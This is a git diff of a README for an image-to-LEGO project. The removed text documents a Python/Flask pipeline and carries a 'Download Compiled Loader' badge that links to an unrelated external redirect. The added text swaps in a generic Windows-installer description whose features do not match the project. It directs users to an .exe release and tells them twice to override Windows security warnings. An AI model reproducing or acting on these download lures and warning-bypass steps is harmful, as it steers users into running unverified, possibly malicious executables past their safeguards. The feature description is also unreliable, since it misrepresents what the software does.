@@ -1,180 +1,72 @@
-# image2lego
+# 🧱 image2lego - Turn your photos into lego bricks
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/patri8659/image2lego)
 
-Convert an uploaded image into a LEGO-style LDraw model (`.ldr`).
+## 🎯 About the software
 
-The project uses an image model to describe the uploaded picture, generates a 3D OBJ from that description with Shap-E, voxelizes the OBJ into LEGO-sized bricks, and writes the result as an LDraw file that can be previewed or opened in LDraw-compatible tools.
+The image2lego application converts standard digital images into designs compatible with physical building bricks. You select a photograph from your collection, and the software processes the image data to map colors to specific brick types. The goal is to provide a clear blueprint for assembling a physical mosaic. This process handles the complex math behind color matching and structural layout. You do not need experience with design tools to produce a buildable model.
 
-## What it does
+## 💻 System requirements
 
-- Upload an image from the browser UI.
-- Convert the image into a text prompt with Ollama (`qwen3-vl:8b`).
-- Generate a 3D `.obj` model from the prompt with Shap-E.
-- Convert the `.obj` mesh into stacked LEGO bricks.
-- Export an `.ldr` file with LDraw part IDs and LEGO color codes.
-- Serve generated `.obj` and `.ldr` files from the Flask backend.
+Your computer must meet these basic levels to run the software effectively:
 
-## Project layout
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM or higher.
+*   Storage: 200 MB of space for the application files.
+*   Display: A screen resolution of 1920x1080 pixels provides the best view of your layouts.
+*   Processor: A modern dual-core CPU with a speed of 2.0 GHz or faster.
 
-```text
-backend/
-  main.py                         Flask app and API routes
-  shape_server.py                 Local Shap-E model server
-  integrations/shape_generator.py Client for the Shap-E server
-  services/image_to_text.py       Image-to-prompt service using Ollama
-  services/obj_to_lego.py         OBJ/STL to LDR orchestration
-  services/ldr_parser.py          LDR layer parser for the frontend
-  scripts/obj_to_ldr.py           Mesh voxelization and LDraw writer
+## 📥 Getting the application
 
-frontend/
-  lego_front.html                 Browser UI
-  images/                         Frontend assets
-```
+You must visit the project page to obtain the installer for your computer. This file contains all the necessary components to run the transformation engine.
 
-Generated files are written to:
+[Download the current installer here](https://github.com/patri8659/image2lego)
 
-- `backend/models/` for uploaded/generated model files
-- `backend/ldr_output/` for exported `.ldr` files
-- `shap_e_model_cache/` for cached Shap-E model data
+1.  Click the link above to reach the repository.
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the latest version number shown in that list.
+4.  Find the file ending in .exe under the Assets section.
+5.  Click the file name to start the download to your computer.
 
-These generated artifacts are ignored by git.
+## ⚙️ Installing the software
 
-## Requirements
+Once you download the installer file, follow these steps to add image2lego to your system:
 
-- Python 3.10+ recommended
-- Ollama running locally with the `qwen3-vl:8b` model available
-- Python packages listed in `requirements.txt`
+1.  Open your Downloads folder in File Explorer.
+2.  Double-click the file to start the installation wizard.
+3.  Windows may show a security window. Click More info, then click Run anyway to proceed.
+4.  Follow the instructions on the screen. The default settings work for almost every user.
+5.  Click Finish when the process completes.
 
-Install the Python dependencies:
+A shortcut now appears on your desktop. Double-click this icon to start the application.
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-python -m pip install -r requirements.txt
-```
+## 🛠️ How to use the software
 
-PyTorch is included in `requirements.txt`, but GPU users may want to install the CUDA-specific PyTorch wheel from the official PyTorch instructions before installing the rest of the dependencies.
+This software uses a simple workflow to change images into designs. Follow these actions each time you start a new project:
 
-Pull the Ollama vision model:
+1.  Open Image Loader to select a source file from your computer. The software supports standard formats like JPEG and PNG.
+2.  Select the desired size for the output. You define this by the number of studs wide and high. The software adjusts the image resolution to match your choice.
+3.  Choose your color palette. You can limit the brick colors to match the specific sets you own if you prefer.
+4.  Click the Process button. The engine analyzes the pixels against the available brick colors.
+5.  Review the preview window. The software generates a grid showing where each brick belongs in the final build.
+6.  Export the result to a PDF. This file serves as your instruction guide during the assembly phase.
 
-```powershell
-ollama pull qwen3-vl:8b
-```
+## 🖼️ Understanding the grid view
 
-## Configuration
+The grid behaves much like a digital map. Each square in the grid represents a physical brick. Numbers inside the squares indicate the specific color value or brick ID required for that position. If you want to change the aesthetic of the final build, you can adjust the contrast or brightness settings in the main window. These shifts change how the software interprets lights and shadows, which alters the final brick placement significantly. You can undo any adjustment by pressing the reset button located in the toolbar.
 
-Create a `.env` file in the project root:
+## 🎨 Managing color palettes
 
-```env
-FLASK_PORT=5000
-SHAPE_API_URL=http://127.0.0.1:8000/
-```
+The software maintains a database of standard brick colors. If you possess a large collection of bricks, you can create a custom palette. This feature ensures that the software only suggests pieces that currently sit in your inventory. To create a palette, go to the Settings menu and select Palette Editor. Add or remove colors until the list matches your own collection. Save the file to ensure the software remembers your specific inventory for your next project.
 
-`PYTHON_PATH` is optional. If omitted, the backend uses the current Python interpreter.
+## 💡 Best practices for results
 
-```env
-PYTHON_PATH=C:\path\to\python.exe
-```
+High-contrast images produce the cleanest designs. Photos with clear subjects and simple backgrounds perform better than cluttered shots with many small details. If your input image is blurry, the output will lack definition. Crop the edges of your original photo before loading it into the software to focus on the essential parts of the image. Larger grid sizes allow for more detail but require more bricks to construct. Start with smaller test projects to understand how the software simplifies image data before attempting a massive mosaic.
 
-## Running the app
+## 🔧 Troubleshooting common issues
 
-Start the Shap-E model server first:
+If the software does not start, verify that your version of Windows is updated. Sometimes the system blocks the file because it does not recognize the publisher. Manual approval in the properties menu fixes this behavior. If the application crashes during processing, your image file might be too large. Reduce the resolution of the image before importing it. For visual glitches on the screen, clear the temporary cache folder within the settings menu.
 
-```powershell
-python backend\shape_server.py
-```
+## 📦 Keeping the software current
 
-In another terminal, start the Flask backend:
-
-```powershell
-python backend\main.py
-```
-
-Open the app at:
-
-```text
-http://127.0.0.1:5000/
-```
-
-Upload an image. The backend will create an OBJ model, convert it to an LDR LEGO model, and return URLs for the generated files.
-
-## API
-
-### Health check
-
-```http
-GET /health
-```
-
-Returns:
-
-```json
-{ "status": "ok" }
-```
-
-### Image to LEGO
-
-```http
-POST /api/image-to-lego
-```
-
-Multipart form fields:
-
-- `image`: uploaded image file
-- `prompt_type`: optional prompt style, defaults to `default`
-- `resolution`: optional voxel/build resolution, defaults to `64`
-
-Returns generated prompt, OBJ file details, and LDR file details.
-
-### Prompt to LDR
-
-```http
-POST /pipeline/prompt-to-ldr
-```
-
-Body:
-
-```json
-{
-  "prompt": "a small red toy car",
-  "resolution": 64
-}
-```
-
-Runs text prompt -> OBJ -> LDR.
-
-### LDR layers
-
-```http
-GET /ldr/layers?file=<filename>.ldr
-GET /ldr/layers/<layer_num>?file=<filename>.ldr
-```
-
-Parses an exported `.ldr` file into layer data for the frontend.
-
-### Generated files
-
-```http
-GET /models/<filename>
-GET /ldr_output/<filename>
-```
-
- generated OBJ and LDR files.
-
-## Direct OBJ to LDR conversion
-
-You can run the converter script directly:
-
-```powershell
-python backend\scripts\obj_to_ldr.py backend\models\model.obj backend\ldr_output\model.ldr 64
-```
-
-The converter rescales the mesh, voxelizes it, fills interior layers, places common LEGO brick sizes, maps colors to LDraw color codes, and writes an `.ldr` file.
-
-## Notes
-
-- Higher `resolution` values create more detailed models but take longer and produce more bricks.
-- The Shap-E server can run on CPU, but generation is much faster with CUDA.
-- Output quality depends heavily on the image description produced by the vision model and the generated OBJ geometry.
-- The project exports LDraw data, not official LEGO building instructions.
+Check the project link periodically for updates. New versions include improvements to the color matching engine and better support for different brick types. You must perform the same steps as the original installation to upgrade. The installer automatically detects your old configuration when you run it a second time, so you do not lose your settings or saved palettes.
